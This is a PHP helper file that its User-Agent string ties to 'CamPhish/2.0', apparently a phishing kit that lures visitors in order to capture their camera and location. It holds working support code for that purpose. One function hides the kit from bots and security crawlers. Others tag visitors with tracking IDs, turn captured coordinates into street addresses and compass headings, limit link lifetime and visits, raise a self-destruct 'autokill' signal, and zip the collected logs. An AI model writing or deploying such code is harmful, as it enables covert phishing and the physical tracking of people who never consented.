<?php
// ═══════════════════════════════════════════════════════════════════
//  helpers.php — Shared utility functions
// ═══════════════════════════════════════════════════════════════════

// ── Bot detection ──────────────────────────────────────────────────
function is_bot() {
    $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
    $bot_patterns = [
        'bot','crawl','spider','slurp','mediapartners','facebookexternalhit',
        'twitterbot','linkedinbot','whatsapp','telegram','discordbot','curl',
        'wget','python-requests','go-http','java','libwww','scrapy','ahrefs',
        'semrush','mj12bot','dotbot','petalbot','bytespider','googlebot',
        'bingbot','yandexbot','baiduspider','duckduckbot'
    ];
    foreach ($bot_patterns as $p) {
        if (str_contains($ua, $p)) return true;
    }
    return false;
}

// ── Session / UUID tracking ────────────────────────────────────────
function get_visitor_uuid() {
    if (session_status() === PHP_SESSION_NONE) {
        session_start();
    }
    if (empty($_SESSION['cp_uuid'])) {
        $_SESSION['cp_uuid'] = sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
            mt_rand(0,0xffff), mt_rand(0,0xffff),
            mt_rand(0,0xffff),
            mt_rand(0,0x0fff)|0x4000,
            mt_rand(0,0x3fff)|0x8000,
            mt_rand(0,0xffff), mt_rand(0,0xffff), mt_rand(0,0xffff)
        );
    }
    return $_SESSION['cp_uuid'];
}

// ── Reverse geocoding via Nominatim ───────────────────────────────
function reverse_geocode($lat, $lon) {
    $url = "https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat={$lat}&lon={$lon}&zoom=14&addressdetails=1";
    $opts = ['http' => [
        'header'  => "User-Agent: CamPhish/2.0\r\n",
        'timeout' => 5,
    ]];
    $json = @file_get_contents($url, false, stream_context_create($opts));
    if (!$json) return '';
    $data = json_decode($json, true);
    return $data['display_name'] ?? '';
}

// ── Speed / heading text ──────────────────────────────────────────
function heading_to_compass($deg) {
    if ($deg === null || $deg === '') return 'N/A';
    $dirs = ['N','NE','E','SE','S','SW','W','NW','N'];
    return $dirs[round($deg / 45) % 8];
}

// ── Link expiry check ─────────────────────────────────────────────
function check_link_expiry() {
    $cfg = include __DIR__ . '/config.php';
    if (!($cfg['link_expiry_enabled'] ?? false)) return true; // not enabled = always valid

    $meta_file = __DIR__ . '/logs/link_meta.json';
    if (!file_exists($meta_file)) return true;

    $meta = json_decode(file_get_contents($meta_file), true) ?? [];

    // Check time expiry
    if (!empty($meta['created_at']) && ($cfg['link_expiry_seconds'] ?? 0) > 0) {
        if ((time() - $meta['created_at']) > $cfg['link_expiry_seconds']) {
            return false;
        }
    }

    // Check visit limit
    if (!empty($cfg['link_max_visits']) && $cfg['link_max_visits'] > 0) {
        $visits = $meta['visits'] ?? 0;
        if ($visits >= $cfg['link_max_visits']) return false;
    }

    return true;
}

function increment_link_visit() {
    $meta_file = __DIR__ . '/logs/link_meta.json';
    if (!is_dir(dirname($meta_file))) mkdir(dirname($meta_file), 0755, true);
    $meta = file_exists($meta_file) ? (json_decode(file_get_contents($meta_file), true) ?? []) : [];
    if (!isset($meta['created_at'])) $meta['created_at'] = time();
    $meta['visits'] = ($meta['visits'] ?? 0) + 1;
    file_put_contents($meta_file, json_encode($meta));
    return $meta['visits'];
}

// ── Autokill signal ───────────────────────────────────────────────
function signal_autokill() {
    $cfg = include __DIR__ . '/config.php';
    if ($cfg['autokill'] ?? false) {
        file_put_contents(__DIR__ . '/logs/AUTOKILL.signal', '1');
    }
}

// ── ZIP all logs ──────────────────────────────────────────────────
function zip_all_logs($output_path) {
    if (!class_exists('ZipArchive')) return false;
    $zip = new ZipArchive();
    if ($zip->open($output_path, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) return false;
    $base = __DIR__ . '/logs';
    $iter = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($base));
    foreach ($iter as $file) {
        if ($file->isFile()) {
            $rel = str_replace($base . DIRECTORY_SEPARATOR, '', $file->getPathname());
            $zip->addFile($file->getPathname(), $rel);
        }
    }
    $zip->close();
    return true;
}
